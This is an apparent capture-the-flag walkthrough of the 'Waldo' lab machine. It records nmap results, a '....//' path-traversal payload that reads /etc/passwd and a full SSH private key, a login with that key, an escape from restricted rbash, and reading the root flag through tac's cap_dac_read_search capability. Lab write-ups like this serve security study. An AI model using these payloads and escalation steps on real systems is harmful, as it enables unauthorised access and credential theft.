@@ -1,0 +1,530 @@
+Machine-Name  :  Waldo
+IP-Address    :  10.129.1.191
+
+Command-Line: sudo nmap -p- -T4 -A 10.129.1.191
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 06:01 UTC
+    Nmap scan report for 10.129.1.191
+    Host is up (0.049s latency).
+    Not shown: 65532 closed ports
+    PORT     STATE    SERVICE        VERSION
+    22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
+    | ssh-hostkey:
+    |   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
+    |   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
+    |_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
+    80/tcp   open     http           nginx 1.12.2
+    |_http-server-header: nginx/1.12.2
+    | http-title: List Manager
+    |_Requested resource was /list.html
+    |_http-trane-info: Problem with XML parsing of /evox/about
+    8888/tcp filtered sun-answerbook
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=4/12%OT=22%CT=1%CU=33486%PV=Y%DS=2%DC=T%G=Y%TM=6073E25
+    OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS
+    OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+    OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+    OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+    OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+    OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+    OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+    OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+    OS:=S)
+
+    Network Distance: 2 hops
+
+    TRACEROUTE (using port 993/tcp)
+    HOP RTT      ADDRESS
+    1   48.91 ms 10.10.14.1
+    2   49.28 ms 10.129.1.191
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 39.28 seconds
+
+Browser: http://waldo.htb/list.html
+Notes: Sent create/delete requests to Burp.
+BurpSuite (Repeater):
+    Result:
+        Request:
+            POST /dirRead.php HTTP/1.1
+            Host: waldo.htb
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+            Accept: */*
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Content-type: application/x-www-form-urlencoded
+            Content-Length: 7
+            Origin: http://waldo.htb
+            Connection: close
+            Referer: http://waldo.htb/list.html
+
+            path=./
+
+        Response:
+            HTTP/1.1 200 OK
+            Server: nginx/1.12.2
+            Date: Mon, 12 Apr 2021 21:26:29 GMT
+            Content-Type: application/json
+            Connection: close
+            X-Powered-By: PHP/7.1.16
+            Content-Length: 155
+
+            [".",
+            "..",
+            ".list",
+            "background.jpg",
+            "cursor.png",
+            "dirRead.php",
+            "face.png",
+            "fileDelete.php",
+            "fileRead.php",
+            "fileWrite.php",
+            "index.php",
+            "list.html",
+            "list.js"]
+
+
+        Request:
+            POST /fileRead.php HTTP/1.1
+            Host: waldo.htb
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+            Accept: */*
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Content-type: application/x-www-form-urlencoded
+            Content-Length: 19
+            Origin: http://waldo.htb
+            Connection: close
+            Referer: http://waldo.htb/list.html
+
+            file=./fileRead.php
+
+        Response:
+            HTTP/1.1 200 OK
+            Server: nginx/1.12.2
+            Date: Mon, 12 Apr 2021 21:34:23 GMT
+            Content-Type: application/json
+            Connection: close
+            X-Powered-By: PHP/7.1.16
+            Content-Length: 577
+
+            {"file":"<?php\n\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\t$fileContent['file'] = false;\n\theader('Content-Type: application\/json');\n\tif(isset($_POST['file'])){\n\t\theader('Content-Type: application\/json');\n\t\t$_POST['file'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['file']);\n\t\tif(strpos($_POST['file'], \"user.txt\") === false){\n\t\t\t$file = fopen(\"\/var\/www\/html\/\" . $_POST['file'], \"r\");\n\t\t\t$fileContent['file'] = fread($file,filesize($_POST['file']));  \n\t\t\tfclose();\n\t\t}\n\t}\n\techo json_encode($fileContent);\n}\n"}
+
+
+
+Notes: Running JSON through jq to organize the output for better readability.
+
+
+Command-Line: curl -s http://waldo.htb/fileRead.php -d "file=fileRead.php"
+Result:
+    {"file":"<?php\n\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\t$fileContent['file'] = false;\n\theader('Content-Type: application\/json');\n\tif(isset($_POST['file'])){\n\t\theader('Content-Type: application\/json');\n\t\t$_POST['file'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['file']);\n\t\tif(strpos($_POST['file'], \"user.txt\") === false){\n\t\t\t$file = fopen(\"\/var\/www\/html\/\" . $_POST['file'], \"r\");\n\t\t\t$fileContent['file'] = fread($file,filesize($_POST['file']));  \n\t\t\tfclose();\n\t\t}\n\t}\n\techo json_encode($fileContent);\n}\n"}
+
+
+Command-Line: curl -s http://waldo.htb/fileRead.php -d "file=fileRead.php"|jq
+Result:
+    {
+      "file": "<?php\n\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\t$fileContent['file'] = false;\n\theader('Content-Type: application/json');\n\tif(isset($_POST['file'])){\n\t\theader('Content-Type: application/json');\n\t\t$_POST['file'] = str_replace( array(\"../\", \"..\\\"\"), \"\", $_POST['file']);\n\t\tif(strpos($_POST['file'], \"user.txt\") === false){\n\t\t\t$file = fopen(\"/var/www/html/\" . $_POST['file'], \"r\");\n\t\t\t$fileContent['file'] = fread($file,filesize($_POST['file']));  \n\t\t\tfclose();\n\t\t}\n\t}\n\techo json_encode($fileContent);\n}\n"
+    }
+
+
+Command-Line: curl -s http://waldo.htb/fileRead.php -d "file=fileRead.php"|jq -r ."file"
+Result:
+    <?php
+
+    if($_SERVER['REQUEST_METHOD'] === "POST"){
+            $fileContent['file'] = false;
+            header('Content-Type: application/json');
+            if(isset($_POST['file'])){
+                    header('Content-Type: application/json');
+                    $_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);
+                    if(strpos($_POST['file'], "user.txt") === false){
+                            $file = fopen("/var/www/html/" . $_POST['file'], "r");
+                            $fileContent['file'] = fread($file,filesize($_POST['file']));
+                            fclose();
+                    }
+            }
+            echo json_encode($fileContent);
+    }
+
+
+Notes: Looking at the code, we can see that if "if(isset($_POST['file']))" results in "TRUE", then "$_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);" will take any "file params" with "../" and replace it with " " (nothing).
+
+Solution: ....//....//....//....//....//etc/passwd
+Notes: The Solution code is equivalent to "../../../../../etc/passwd"
+BurpSuite (Repeater):
+    Result:
+        Request:
+            POST /fileRead.php HTTP/1.1
+            Host: waldo.htb
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+            Accept: */*
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Content-type: application/x-www-form-urlencoded
+            Content-Length: 45
+            Origin: http://waldo.htb
+            Connection: close
+            Referer: http://waldo.htb/list.html
+
+            file=....//....//....//....//....//etc/passwd
+
+        Response:
+            HTTP/1.1 200 OK
+            Server: nginx/1.12.2
+            Date: Mon, 12 Apr 2021 21:51:03 GMT
+            Content-Type: application/json
+            Connection: close
+            X-Powered-By: PHP/7.1.16
+            Content-Length: 1443
+
+            {"file":"root:x:0:0:root:\/root:\/bin\/ash\nbin:x:1:1:bin:\/bin:\/sbin\/nologin\ndaemon:x:2:2:daemon:\/sbin:\/sbin\/nologin\nadm:x:3:4:adm:\/var\/adm:\/sbin\/nologin\nlp:x:4:7:lp:\/var\/spool\/lpd:\/sbin\/nologin\nsync:x:5:0:sync:\/sbin:\/bin\/sync\nshutdown:x:6:0:shutdown:\/sbin:\/sbin\/shutdown\nhalt:x:7:0:halt:\/sbin:\/sbin\/halt\nmail:x:8:12:mail:\/var\/spool\/mail:\/sbin\/nologin\nnews:x:9:13:news:\/usr\/lib\/news:\/sbin\/nologin\nuucp:x:10:14:uucp:\/var\/spool\/uucppublic:\/sbin\/nologin\noperator:x:11:0:operator:\/root:\/bin\/sh\nman:x:13:15:man:\/usr\/man:\/sbin\/nologin\npostmaster:x:14:12:postmaster:\/var\/spool\/mail:\/sbin\/nologin\ncron:x:16:16:cron:\/var\/spool\/cron:\/sbin\/nologin\nftp:x:21:21::\/var\/lib\/ftp:\/sbin\/nologin\nsshd:x:22:22:sshd:\/dev\/null:\/sbin\/nologin\nat:x:25:25:at:\/var\/spool\/cron\/atjobs:\/sbin\/nologin\nsquid:x:31:31:Squid:\/var\/cache\/squid:\/sbin\/nologin\nxfs:x:33:33:X Font Server:\/etc\/X11\/fs:\/sbin\/nologin\ngames:x:35:35:games:\/usr\/games:\/sbin\/nologin\npostgres:x:70:70::\/var\/lib\/postgresql:\/bin\/sh\ncyrus:x:85:12::\/usr\/cyrus:\/sbin\/nologin\nvpopmail:x:89:89::\/var\/vpopmail:\/sbin\/nologin\nntp:x:123:123:NTP:\/var\/empty:\/sbin\/nologin\nsmmsp:x:209:209:smmsp:\/var\/spool\/mqueue:\/sbin\/nologin\nguest:x:405:100:guest:\/dev\/null:\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/home\/nobody:\/bin\/sh\nnginx:x:100:101:nginx:\/var\/lib\/nginx:\/sbin\/nologin\n"}
+
+
+Command-Line: curl -s http://waldo.htb/fileRead.php -d "file=....//....//....//....//....//etc/passwd"|jq -r ."file"
+Result:
+    root:x:0:0:root:/root:/bin/ash
+    bin:x:1:1:bin:/bin:/sbin/nologin
+    daemon:x:2:2:daemon:/sbin:/sbin/nologin
+    adm:x:3:4:adm:/var/adm:/sbin/nologin
+    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+    sync:x:5:0:sync:/sbin:/bin/sync
+    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+    halt:x:7:0:halt:/sbin:/sbin/halt
+    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+    news:x:9:13:news:/usr/lib/news:/sbin/nologin
+    uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+    operator:x:11:0:operator:/root:/bin/sh
+    man:x:13:15:man:/usr/man:/sbin/nologin
+    postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+    cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+    ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+    sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+    at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+    squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+    xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+    games:x:35:35:games:/usr/games:/sbin/nologin
+    postgres:x:70:70::/var/lib/postgresql:/bin/sh
+    cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+    vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+    ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+    smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+    guest:x:405:100:guest:/dev/null:/sbin/nologin
+    nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
+    nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
+
+Notes: Found User "nobody" inside the /home directory.
+
+Command-Line: curl -s http://waldo.htb/dirRead.php -d "path=....//....//....//"|jq
+Result:
+    [
+      ".",
+      "..",
+      ".dockerenv",
+      "bin",
+      "dev",
+      "etc",
+      "home",
+      "lib",
+      "media",
+      "mnt",
+      "proc",
+      "root",
+      "run",
+      "sbin",
+      "srv",
+      "sys",
+      "tmp",
+      "usr",
+      "var"
+    ]
+
+
+Command-Line: curl -s http://waldo.htb/dirRead.php -d "path=....//....//....//home/nobody"|jq
+Result:
+    [
+      ".",
+      "..",
+      ".ash_history",
+      ".ssh",
+      ".viminfo",
+      "user.txt"
+    ]
+
+
+Command-Line: curl -s http://waldo.htb/dirRead.php -d "path=....//....//....//home/nobody/"|jq
+Result:
+    [
+      ".",
+      "..",
+      ".ash_history",
+      ".ssh",
+      ".viminfo",
+      "user.txt"
+    ]
+
+
+Command-Line: curl -s http://waldo.htb/fileRead.php -d "file=....//....//....//home/nobody/.ssh/.monitor"|jq -r .'file'
+Result:
+    -----BEGIN RSA PRIVATE KEY-----
+    MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
+    mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
+    87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
+    dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
+    o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
+    vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
+    vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
+    pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
+    8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
+    1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
+    VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
+    dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
+    v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
+    xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
+    qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
+    yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
+    /pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
+    LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
+    lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
+    w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
+    1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
+    rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
+    X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
+    DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
+    W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
+    -----END RSA PRIVATE KEY-----
+
+
+Command-Line: curl -s http://waldo.htb/fileRead.php -d "file=....//....//....//home/nobody/.ssh/.monitor"|jq -r .'file' > id_rsa
+Result:
+    /id_rsa
+
+Command-Line: ssh -i id_rsa nobody@waldo.htb
+Result:
+    *** USER ACCESS ***
+    The authenticity of host 'waldo.htb (10.129.1.191)' can't be established.
+    ECDSA key fingerprint is SHA256:S4nfJbcTY7WAdYp2v16xgnUj4MEIzqZ/jwbGI92FXEk.
+    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+    Warning: Permanently added 'waldo.htb' (ECDSA) to the list of known hosts.
+    Welcome to Alpine!
+
+    The Alpine Wiki contains a large amount of how-to guides and general
+    information about administrating Alpine systems.
+    See <http://wiki.alpinelinux.org>.
+    waldo:~$
+
+
+waldo:~$ cat user.txt
+Result: 32768bcd7513275e085fd4e7b63e9d24
+    *** USER OWNED ***
+
+waldo:/dev/shm$ /bin/sh ./LinEnum.sh
+Result:
+    [-] Kernel information (continued):
+    Linux version 4.9.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.88-1 (2018-04-29)
+
+    [-] Specific release information:
+    3.6.2
+    NAME="Alpine Linux"
+    ID=alpine
+    VERSION_ID=3.6.2
+    PRETTY_NAME="Alpine Linux v3.6"
+    HOME_URL="http://alpinelinux.org"
+    BUG_REPORT_URL="http://bugs.alpinelinux.org"
+
+    [-] Listening TCP:
+    Active Internet connections (only servers)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -
+    tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -
+    tcp        0      0 :::80                   :::*                    LISTEN      -
+    tcp        0      0 :::22                   :::*                    LISTEN      -
+    tcp        0      0 :::8888                 :::*                    LISTEN      -
+
+
+    [-] Network and IP info:
+    docker0   Link encap:Ethernet  HWaddr 02:42:AE:73:83:F7
+              inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
+              UP BROADCAST MULTICAST  MTU:1500  Metric:1
+              RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:0
+              RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+    ens192    Link encap:Ethernet  HWaddr 00:50:56:B9:93:5F
+              inet addr:10.129.1.191  Bcast:10.129.255.255  Mask:255.255.0.0
+              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+              RX packets:3201906 errors:0 dropped:2399 overruns:0 frame:0
+              TX packets:2494598 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:1000
+              RX bytes:743751615 (709.2 MiB)  TX bytes:799012418 (761.9 MiB)
+
+    lo        Link encap:Local Loopback
+              inet addr:127.0.0.1  Mask:255.0.0.0
+              UP LOOPBACK RUNNING  MTU:65536  Metric:1
+              RX packets:13289031 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:13289031 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:1
+              RX bytes:1951219372 (1.8 GiB)  TX bytes:1951219372 (1.8 GiB)
+
+Notes: *** INSIDE DOCKER CONTAINER ***
+
+Notes: Taking a closer look using netstat.
+
+waldo:/$ netstat -anlp
+Result:
+    netstat: can't scan /proc - are you root?
+    Active Internet connections (servers and established)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -
+    tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -
+    tcp        0    452 10.129.1.191:8888       10.10.14.85:35816       ESTABLISHED -
+    tcp        0      0 :::80                   :::*                    LISTEN      -
+    tcp        0      0 :::22                   :::*                    LISTEN      -
+    tcp        0      0 :::8888                 :::*                    LISTEN      -
+    udp        0      0 10.129.1.191:54882      1.1.1.1:53              ESTABLISHED -
+
+
+Notes: Listening on every interface using port 8888. Currently connected to port 8888 (10.129.1.191:8888       10.10.14.85:35816).
+
+
+Notes: Checking what is on port 9000.
+
+waldo:/home/nobody/.ssh$ cat authorized_keys
+Result:
+    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
+
+Notes: Found user "monitor".
+
+waldo:~/.ssh$ ssh -i .monitor monitor@waldo
+Result:
+    Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
+            &.
+          @@@,@@/ %
+       #*/%@@@@/.&@@,
+   @@@#@@#&@#&#&@@@,*%/
+   /@@@&###########@@&*(*
+ (@################%@@@@@.     /**
+ @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/
+ %@@@@%##########&@@@....                 .#%#@@@@@@@#
+ @@&%#########@@@@/                        */@@@%(((@@@%
+    @@@#%@@%@@@,                       *&@@@&%(((#((((@@(
+     /(@@@@@@@                     *&@@@@%((((((((((((#@@(
+       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,
+          %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &
+        *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/
+       /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&
+      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&
+      %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/
+      @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
+     @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@*
+     @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
+     *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
+       @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
+        @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
+          .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*
+            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(
+            .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/
+           *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/
+          *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@
+          *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#
+           (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@
+             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#
+               %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,
+                ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@
+                 &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@
+                 /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(
+                  @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*
+                  *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@
+                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,
+                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
+                        &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#
+                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
+                         ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,
+                          *@@,,,,,,,.,****,..,,,,,,,,&@@
+                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@
+                           .@@,,,,,,,,,,,,,...,,,,,,@@
+                            ,@@@,,,,,,,,,,,,,,,,.(@@@
+                              %@@@@&(,,,,*(#&@@@@@@,
+
+                                Here's Waldo, where's root?
+    Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1
+    -rbash: alias: command not found
+    monitor@waldo:~$
+
+monitor@waldo:~$ ls
+Result:
+    app-dev  bin
+
+monitor@waldo:~$ cd bin
+Result:
+    -rbash: cd: restricted
+
+Notes: Unable to execute regular Linux commands inside the shell. Checking $PATH.
+
+monitor@waldo:~$ echo $PATH
+Result:
+    /home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
+Notes: PATH not directing to correct directories (explains the weird behavior). Copying $PATH from my own directory and exporting it in "monitor@waldo".
+
+Command-Line: echo $PATH
+Result:
+    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+
+monitor@waldo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+Result:
+    -rbash: PATH: readonly variable
+
+Notes: Unable to set $PATH. Logging out, then logging back in with SSH and the -t command to force tty.
+Command-Line: man ssh
+Result:
+    [-t]  Force pseudo-terminal allocation. This can be used to execute arbitrary screen-based programs on a remote machine, which can be very useful, e.g. when implementing menu services. Multiple -t options force tty allocation, even if ssh has no local tty.
+
+
+monitor@waldo:~$ exit
+    logout
+    -rbash: dircolors: command not found
+    -rbash: alias: command not found
+    -rbash: .: /usr/share/bash-completion/bash_completion: restricted
+    -rbash: PATH: readonly variable
+    Connection to waldo closed.
+waldo:~/.ssh$ ssh -i .monitor monitor@waldo -t bash
+monitor@waldo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+monitor@waldo:~$ cd bin
+monitor@waldo:~/bin$ ls
+ls  most  red  rnano
+
+Notes: Normal Behavior.
+Result:
+    *** SUCCESS ***
+
+
+Notes: Ran LinEnum.sh, but did not find anything. Switching to "/" directory and running scan to get "capabilities".
+monitor@waldo:/$ getcap -r * 2>/dev/null
+Result:
+    home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
+    usr/bin/tac = cap_dac_read_search+ei
+
+Notes: usr/bin/tac = cap_dac_read_search+ei
+Browser: cap_dac_read_search
+URL: https://man7.org/linux/man-pages/man7/capabilities.7.html
+Result:
+    CAP_DAC_READ_SEARCH
+                  * Bypass file read permission checks and directory read
+                    and execute permission checks;
+                  * invoke open_by_handle_at(2);
+                  * use the linkat(2) AT_EMPTY_PATH flag to create a link to
+                    a file referred to by a file descriptor.
+
+Notes: "Bypass file read permission checks and directory read and execute permission checks;"... Sounds good to me!
+
+monitor@waldo:/$ tac /root/root.txt
+Result: 8fb67c84418be6e45fbd348fd4584f6c
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
